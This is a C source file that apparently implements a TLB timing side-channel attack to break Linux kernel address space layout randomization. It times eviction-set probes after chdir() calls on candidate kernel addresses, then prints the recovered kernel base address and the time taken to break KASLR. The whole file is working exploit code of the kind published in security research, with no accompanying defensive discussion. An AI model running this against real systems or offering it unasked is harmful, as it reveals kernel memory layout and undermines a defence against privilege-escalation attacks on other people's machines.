#define _GNU_SOURCE
#include "config.h"
#include "memory.h"
#include <errno.h>
#include <pwd.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

#define CALIBRATION_ITERS 100000

uint64_t *res;

//------------------------//
char *user = "./";
//------------------------//

int leak_val(void *addr) {
  chdir(addr);
  chdir(addr);
  chdir(addr);
  return 1;
}

void get_cycle(uint64_t *valid_cycle, uint64_t *invalid_cycle) {
  void *eset_dtlb[DTLB_EVSET_SIZE_4K];
  void *eset_stlb[STLB_EVSET_SIZE_4K];
  register uint64_t tmp;

  char *test_addr;
  posix_memalign(&test_addr, PAGE_SIZE, PAGE_SIZE);
  *test_addr = 1;
  gen_eset(test_addr, eset_stlb, eset_dtlb);

  tmp = 0;
  for (int i = 0; i < CALIBRATION_ITERS; i++) {
    prime(eset_stlb);
    maccess(test_addr);
    tmp += probe(eset_stlb);
  }

  *valid_cycle = tmp / CALIBRATION_ITERS;

  tmp = 0;
  for (int i = 0; i < CALIBRATION_ITERS; i++) {
    prime(eset_stlb);
    memory_fence();
    tmp += probe(eset_stlb);
  }
  *invalid_cycle = tmp / CALIBRATION_ITERS;
}

int main(int argc, char *argv[]) {
  void *addr;
  void *eset_dtlb[DTLB_EVSET_SIZE_4K];
  void *eset_stlb[STLB_EVSET_SIZE_4K];
  void *target[TRAINING_ITERS] = {user, user, user, user, user, user};
  uint64_t valid_cycle, invalid_cycle;
  struct timeval tv_s, tv_e;
  register uint64_t tmp, threshold;

  res = (uint64_t *)malloc(sizeof(uint64_t) * 10000000);

  pin_to_core(0);

  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  init_tlb_flush();

  get_cycle(&valid_cycle, &invalid_cycle);
  threshold = invalid_cycle + (valid_cycle - invalid_cycle) / 3;

  printf("[Probing cycle] valid address : %llu, invalid address : %llu, "
         "threshold : %llu\n\n",
         valid_cycle, invalid_cycle, threshold);

  printf("========Start to finding kernel slide!========\n");

  memset(res, 0, sizeof(uint64_t) * 10000000);
  int64_t idx = 0;

  gettimeofday(&tv_s, NULL);

  for (int i = 0; i < ITERATION; i++) {
    for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
      idx = (s_idx * 73) % NUM_SLOT;
      addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * idx);
      target[TRAINING_ITERS - 1] = addr;
      gen_eset(addr, eset_dtlb, eset_stlb);
      do {
        for (int j = 0; j < TRAINING_ITERS; j++) {
          prime(eset_stlb);
          leak_val(target[j]);
        }
        tmp = probe(eset_stlb);
      } while (tmp < (invalid_cycle - 200) || tmp > (valid_cycle + 200));
      res[idx] += tmp;
    }
  }

  uint64_t valid_page_cnt = 0;
  void *end_kern_map_addr = 0;
  uint64_t kern_size_slot = KERN_MAP_SIZE / ALIGN_SIZE;

  // TODO make sure all 10 last pages are mapped
  for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
    if (res[s_idx] / ITERATION > threshold) {
      valid_page_cnt++;
      if (valid_page_cnt > 10) {
        valid_page_cnt = 0;
        for (int s_jdx = s_idx + kern_size_slot; s_jdx > 0; s_jdx--) {
          if (res[s_jdx] / ITERATION > threshold) {
            if (valid_page_cnt == 0) {
              end_kern_map_addr =
                  (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * s_jdx);
              valid_page_cnt++;
            } else if (valid_page_cnt > 10) {
              break;
            } else {
              valid_page_cnt++;
            }
          } else {
            valid_page_cnt = 0;
          }
        }
        break;
      }
    } else {
      valid_page_cnt = 0;
    }
  }

  gettimeofday(&tv_e, NULL);

  double start = (tv_s.tv_sec) * 1000 + (tv_s.tv_usec) / 1000.0;
  double end = (tv_e.tv_sec) * 1000 + (tv_e.tv_usec) / 1000.0;
  double diff = (end - start) / 1000.0;

  void *kernel_map_addr = end_kern_map_addr - KERN_MAP_SIZE - 0x1000;

#ifdef __DEBUG
  char *dfp = fopen(RESULT_FILE, "w");
  addr = (void *)KERN_MAP_MIN_ADDR;
  for (uint64_t x = 0; x < NUM_SLOT; x++) {
    addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * x);
    fprintf(dfp, "0x%llx %llu\n", addr, res[x] / ITERATION);
  }
  fprintf(dfp, "0x%llx\n", kernel_map_addr);
  fclose(dfp);
#endif

  printf("kernel map addr\t= \033[1;31m0x%llx\033[0m\n", kernel_map_addr);
  printf("Time to break KASLR\t= %.2fs\n", diff);
  printf("==============================================\n");
  return 0;
}
